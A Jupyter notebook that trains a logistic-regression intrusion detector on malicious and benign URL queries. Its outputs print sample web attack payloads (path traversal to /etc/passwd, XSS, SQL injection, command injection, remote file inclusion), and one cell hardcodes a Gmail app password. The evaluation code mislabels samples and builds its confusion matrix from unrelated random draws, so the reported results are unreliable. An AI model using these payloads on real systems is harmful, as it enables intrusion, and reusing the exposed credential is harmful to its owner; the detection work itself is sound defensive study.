{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "import os\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn import metrics\n",
    "import urllib.parse\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def loadFile(name):\n",
    "    directory = str(os.getcwd())\n",
    "    filepath = os.path.join(directory, name)\n",
    "    with open(filepath,'r') as f:\n",
    "        data = f.readlines()\n",
    "    data = list(set(data))\n",
    "    result = []\n",
    "    for d in data:\n",
    "        d = str(urllib.parse.unquote(d))   #converting url encoded data to simple string\n",
    "        result.append(d)\n",
    "    return result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "badQueries = loadFile('/Users/tejaswinisudhakar/Downloads/badqueries.txt')\n",
    "validQueries = loadFile('/Users/tejaswinisudhakar/Downloads/goodqueries.txt')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "BAD QUERIES\n",
      "/..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\{FILE}\n",
      " : 1\n",
      "/cleartrust/ct_logon.jsp?ctloginerrormsg=<script>alert(1)</script>\n",
      " : 1\n",
      "/index.php?RP_PATH=XXpathXX\n",
      " : 1\n",
      "/recordings/gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd\n",
      " : 1\n",
      "|echo YSISTZ$((83+82))$(echo YSISTZ)YSISTZ//\n",
      " : 1\n",
      "/main.php?logout=;uname\\x09>q84429989\\x09#\n",
      " : 1\n",
      "/scripts/axdgpyi2bn6f.cgi\n",
      " : 1\n",
      "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}\n",
      " : 1\n",
      "/examples/jsp/jsp2/jspx/search.cgi?..\\..\\..\\..\\..\\..\\winnt\\win.ini\n",
      " : 1\n",
      "VALID QUERIES\n",
      "/navbanner_05/\n",
      " : 0\n",
      "/javascript/xls.php\n",
      " : 0\n",
      "/freecheck_263x220/\n",
      " : 0\n",
      "/javascript/codecs.fcgi\n",
      " : 0\n",
      "/x_windows/\n",
      " : 0\n",
      "/122471/\n",
      " : 0\n",
      "/lanmessage/\n",
      " : 0\n",
      "/itordboken/\n",
      " : 0\n",
      "/1903663/\n",
      " : 0\n",
      "/58272265/\n",
      " : 0\n"
     ]
    }
   ],
   "source": [
    "badQueries = list(set(badQueries))\n",
    "validQueries = list(set(validQueries))\n",
    "allQueries = badQueries + validQueries\n",
    "yBad = [1 for i in range(0, len(badQueries))]  #labels, 1 for malicious and 0 for clean\n",
    "yGood = [0 for i in range(0, len(validQueries))]\n",
    "y = yBad + yGood\n",
    "queries = allQueries\n",
    "print(\"BAD QUERIES\")    #Processed dataset for bad queries\n",
    "for i in range(1,10):\n",
    "    print(allQueries[i],\":\",y[i])\n",
    "print(\"VALID QUERIES\")             #Processed dataset for good queries\n",
    "for i in range(1265974,1265984):\n",
    "    print(allQueries[i],\":\",y[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "vectorizer = TfidfVectorizer(min_df = 0.0, analyzer=\"char\", sublinear_tf=True, ngram_range=(1,3)) #converting data to vectors\n",
    "X = vectorizer.fit_transform(queries)\n",
    "\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) #splitting data\n",
    "badCount = len(badQueries)\n",
    "validCount = len(validQueries)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "LogisticRegression(solver='liblinear')"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lgs = LogisticRegression(solver='liblinear') # (class_weight='balanced')\n",
    "lgs.fit(X_train, y_train) #training our model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "TEST DATA\n",
      "%u0022%u003e%u003cscript%u003ealert%u0028%u0027XSS%u0027%u0029%u003b%u003c%uff0fscript%u003e\n",
      " : NO INTRUSION DETECTED\n",
      "/javascript/webcasts.exe\n",
      " : NO INTRUSION DETECTED\n",
      "/r3le3om5.php3?<script>cross_site_scripting.nasl</script>\n",
      " : NO INTRUSION DETECTED\n",
      "/cgi-915/testcgi.exe\n",
      " : NO INTRUSION DETECTED\n",
      "/eg2u8pbv.fts?<script>cross_site_scripting.nasl</script>\n",
      " : NO INTRUSION DETECTED\n",
      "/javascript/.htpasswd.sfish/http://skipfish.invalid/;?\n",
      " : NO INTRUSION DETECTED\n",
      "/scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1340614335,0,0,0,0,0--\n",
      " : NO INTRUSION DETECTED\n",
      "\n",
      " str=$(echo YCSCIW)\n",
      " str1=${#str}\n",
      " if [ 6 -ne ${str1} ]\n",
      " then sleep 0\n",
      " else sleep 1\n",
      " fi //\n",
      " : NO INTRUSION DETECTED\n",
      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}\n",
      " : NO INTRUSION DETECTED\n",
      "/awstats/awstats.pl?migrate=|echo;/bin/echo -en \"h\\0300\\0250\\0312fh\\0002\\0000\\0344\\0335\\0211\\0340j\\0020pr\" >> /tmp/urcppbumwm0;echo|awstats490058.txt\n",
      " : NO INTRUSION DETECTED\n",
      "/script/gestion/index.php?path_inc=http://192.168.202.118:8080/ghl9il?\n",
      " : NO INTRUSION DETECTED\n",
      "'&&echo$IFSNIRIZQ$((64+4))$(echo$IFSNIRIZQ)NIRIZQ\n",
      " : INTRUSION DETECTED\n",
      "/quagynka.idc?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\n",
      " : NO INTRUSION DETECTED\n",
      "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n",
      " : NO INTRUSION DETECTED\n",
      "/main.php?stuff=\"ver\\x0c>q43448647&rem\\x0c\n",
      " : NO INTRUSION DETECTED\n",
      "/manager/file.php?path=/etc/passwd\\x00\n",
      " : NO INTRUSION DETECTED\n",
      "declare @s varchar (8000) select @s = 0x73656c ...\n",
      " : NO INTRUSION DETECTED\n",
      "<  script > < / script>\n",
      " : INTRUSION DETECTED\n",
      "/miz4r5hz.jspa?<meta http-equiv=set-cookie content=\"testviqu=1270\">\n",
      " : NO INTRUSION DETECTED\n",
      "/examples/servlets/servlet/search.php?searchstring=<script>foo</script>\n",
      " : NO INTRUSION DETECTED\n",
      "/scripts/index.php?src=1&_common=1&time=1331905227&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\\x00\n",
      " : NO INTRUSION DETECTED\n",
      "admin --\n",
      " : NO INTRUSION DETECTED\n",
      "%22| [ 3 -ne $(echo EHUILY | tr -d '\\n' | wc -c) ] || sleep 1 %22\n",
      " : NO INTRUSION DETECTED\n",
      "<import namespace=\"t\" implementation=\"#default#time2\">\n",
      " : INTRUSION DETECTED\n",
      "| [ 2 -ne $(echo HDECHS | tr -d '\\n' | wc -c) ] || sleep 1 %27\n",
      " : NO INTRUSION DETECTED\n",
      "/examples/servlets/servlet/myevent.php?myevent_path=/etc/passwd\\x00\n",
      " : NO INTRUSION DETECTED\n",
      "/moodle/filter/tex/texed.php?formdata=foo&pathname=foo\"+||+echo+db+6f+61+64+4c+69+62+72+61+72+79+41+00+00+00+00+47+65+74+50+72+6f+63+41+64+64++>>ctdn\n",
      " : INTRUSION DETECTED\n",
      "/scripts/yabb.pl?board=news&action=display&num=../../../../../../etc/passwd\\x00\n",
      " : NO INTRUSION DETECTED\n",
      "/javascript/creator.exe\n",
      " : NO INTRUSION DETECTED\n",
      "/examples/jsp/num/sawmill6cl.exe?ho+{complete_version}\n",
      " : NO INTRUSION DETECTED\n",
      "Bad samples: 44532\n",
      "Good samples: 1265974\n",
      "Baseline Constant negative: 0.966019\n",
      "------------\n",
      "Accuracy: 0.998962\n",
      "Precision: 0.999531\n",
      "Recall: 0.969497\n",
      "F1-Score: 0.984285\n",
      "AUC: 0.999653\n"
     ]
    }
   ],
   "source": [
    "##############\n",
    "# Evaluation #\n",
    "##############\n",
    "\n",
    "predicted = lgs.predict(X_test)\n",
    "\n",
    "fpr, tpr, _ = metrics.roc_curve(y_test, (lgs.predict_proba(X_test)[:, 1])) #performance matrix to measure classification model tpr should be high, fpr should be low. So that the model is not unfit or overfit\n",
    "auc = metrics.auc(fpr, tpr) \n",
    "print(\"TEST DATA\")\n",
    "for i in range(1020,1050):   #Testing data\n",
    "    if(y_test[i] == 1):\n",
    "        print(allQueries[i],\": INTRUSION DETECTED\") \n",
    "    else:\n",
    "        print(allQueries[i],\": NO INTRUSION DETECTED\")\n",
    "print(\"Bad samples: %d\" % badCount)\n",
    "print(\"Good samples: %d\" % validCount)\n",
    "print(\"Baseline Constant negative: %.6f\" % (validCount / (validCount + badCount)))\n",
    "print(\"------------\")\n",
    "print(\"Accuracy: %f\" % lgs.score(X_test, y_test))  #checking the accuracy\n",
    "print(\"Precision: %f\" % metrics.precision_score(y_test, predicted)) #Precision is all the points that are declared to be positive but what percentage of them are actually positive.\n",
    "\n",
    "print(\"Recall: %f\" % metrics.recall_score(y_test, predicted)) #Recall is all the points that are actually positive but what percentage declared positive\n",
    "print(\"F1-Score: %f\" % metrics.f1_score(y_test, predicted)) #F1-Score is used to measure test accuracy. It is a weighted average of the precision and recall. When F1 score is 1 it’s best and on 0 it’s worst.\n",
    "print(\"AUC: %f\" % auc) #Accuracy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 2 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import random\n",
    "actual = random.sample(y,1000)\n",
    "predicted = random.sample(y_test,1000)\n",
    "confusion_matrix = metrics.confusion_matrix(actual, predicted)\n",
    "cm_display = metrics.ConfusionMatrixDisplay(confusion_matrix = confusion_matrix, display_labels = [\"NO INTRUSION\", \"INTRUSION\"])\n",
    "cm_display.plot()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib\n",
    "from email.message import EmailMessage\n",
    "def email_alert(subject,body,to):\n",
    "    msg = EmailMessage()\n",
    "    msg.set_content(body)\n",
    "    msg['subject'] = subject\n",
    "    msg['to'] = to\n",
    "    user = \"email.alert.secure@gmail.com\"\n",
    "    msg['from'] = user\n",
    "    password = \"ydoavmtsyyktmxzd\"\n",
    "    \n",
    "    server = smtplib.SMTP(\"smtp.gmail.com\", 587)\n",
    "    server.starttls()\n",
    "    server.login(user,password)\n",
    "    server.send_message(msg)\n",
    "    \n",
    "    server.quit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter the url to be tested :\"&echo$IFSPSTQXK$((12+96))$(echo$IFSPSTQXK)PSTQXK\n"
     ]
    }
   ],
   "source": [
    "url_test = input(\"Enter the url to be tested :\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'allQueries' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-2-9dac7aeb370b>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0mi\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mrange\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1040\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;36m1050\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m     \u001b[0;32mif\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0murl_test\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstrip\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0mallQueries\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mi\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstrip\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0my_test\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mi\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      3\u001b[0m         \u001b[0memail_alert\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"ALERT!!\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"Intrusion Detected in your URL \"\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0murl_test\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"tejaswanisudhakar@gmail.com\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Message sent successfully !!\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mNameError\u001b[0m: name 'allQueries' is not defined"
     ]
    }
   ],
   "source": [
    "for i in range(1040,1050):\n",
    "    if(url_test.strip() == allQueries[i].strip() and y_test[i] == 1):\n",
    "        email_alert(\"ALERT!!\", \"Intrusion Detected in your URL \"+url_test, \"tejaswanisudhakar@gmail.com\")\n",
    "        print(\"Message sent successfully !!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
